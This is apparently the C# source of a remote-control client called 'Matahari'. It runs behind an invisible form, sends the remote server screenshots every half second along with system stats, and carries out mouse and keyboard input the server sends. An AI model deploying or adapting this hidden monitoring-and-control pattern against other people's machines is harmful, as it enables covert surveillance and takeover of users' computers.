using IniFile;
using Microsoft.VisualBasic.Devices;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace Matahari
{
    internal static class MatahariClient
    {
        private static readonly PerformanceCounter cpuCounter = new("Processor", "% Processor Time", "_Total");
        private static readonly PerformanceCounter ramCounter = new("Memory", "Available MBytes");

        private static string address = string.Empty;
        private static int port;

        private static Socket? socket;
        private static NetworkStream? stream;

        [STAThread]
        static void Main()
        {
            // Read configuration data and check if complete
            if (!ReadConfiguration())
            {
                return;
            }

            // Start network client
            Task.Run(() => RunClient());

            // Initialize invisible form
            ApplicationConfiguration.Initialize();
            Application.Run(new HiddenForm());
        }

        private static bool ReadConfiguration()
        {
            Ini configuration = new("config.ini");
            string? message = null;

            try
            {
                if (!configuration.Contains("Server"))
                {
                    throw new Exception("server information missing");
                }

                address = configuration["Server"]["Address"];
                port = configuration["Server"]["Port"];
            }
            catch (Exception e)
            {
                message = e.Message;
            }

            if (message != null)
            {
                MessageBox.Show("Configuration invalid. (" + message + ")", "matahari", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            return true;
        }

        private static void RunClient()
        {
            IPEndPoint endPoint = new(IPAddress.Parse(address), port);
            socket = new(endPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);

            while (!socket.Connected)
            {
                try
                {
                    socket.Connect(endPoint);
                }
                catch { }
            }

            // Send LoginPacket as soon as connection is established
            stream = new(socket, true);
            PacketUtility.WritePacket(stream, new LoginPacket(Environment.MachineName));

            // Start heartbeat task
            Task.Run(() => StartHeartbeat());

            // Read incoming packets while connected
            while (socket.Connected)
            {
                try
                {
                    Packet packet = PacketUtility.ReadPacket(stream);
                    if (packet != null)
                    {
                        HandlePacket(packet);
                    }
                }
                catch { }
            }

            RunClient();
        }

        [DllImport("user32.dll", SetLastError = true)]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, uint dwExtraInfo);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern void keybd_event(uint bVk, uint bScan, uint dwFlags, uint dwExtraInfo);


        private static void HandlePacket(Packet packet)
        {
            if (packet is ClickPacket clickPacket)
            {
                Size screenSize = new ScreenshotCreator().CalculateFullScreenSize();

                int x = (int)(screenSize.Width * clickPacket.X);
                int y = (int)(screenSize.Height * clickPacket.Y);

                Cursor.Position = new Point(x, y);

                if (clickPacket.Button == ((int)MouseButtons.Left))
                {
                    mouse_event((uint)(clickPacket.Down ? 0x0002 : 0x0004), (uint)x, (uint)y, 0, 0);
                }
                else if (clickPacket.Button == ((int)MouseButtons.Middle))
                {
                    mouse_event((uint)(clickPacket.Down ? 0x0020 : 0x0040), (uint)x, (uint)y, 0, 0);
                }
                else if (clickPacket.Button == ((int)MouseButtons.Right))
                {
                    mouse_event((uint)(clickPacket.Down ? 0x0008 : 0x0010), (uint)x, (uint)y, 0, 0);
                }
            }
            else if (packet is MouseWheelPacket wheelPacket)
            {
                mouse_event(0x0800, 0, 0, (uint)wheelPacket.Delta, 0);
            }
            else if (packet is KeyPressPacket keyPressPacket)
            {
                keybd_event((uint)keyPressPacket.Key, 0, (uint)(keyPressPacket.Down ? 0x0001 | 0 : 0x0001 | 0x0002), 0);
            }
        }

        private static void StartHeartbeat()
        {
            long lastHeartbeat = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
            while (socket.Connected)
            {
                long now = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();

                if (now - lastHeartbeat >= 500)
                {
                    try
                    {
                        Bitmap screenshot = new ScreenshotCreator().CreateScreenshot();
                        PowerStatus status = SystemInformation.PowerStatus;

                        PacketUtility.WritePacket(stream, new HeartbeatPacket(screenshot,
                            cpuCounter.NextValue(), ramCounter.NextValue(), (int)status.BatteryChargeStatus));
                    }
                    catch { }

                    lastHeartbeat = now;
                }
            }
        }
    }
}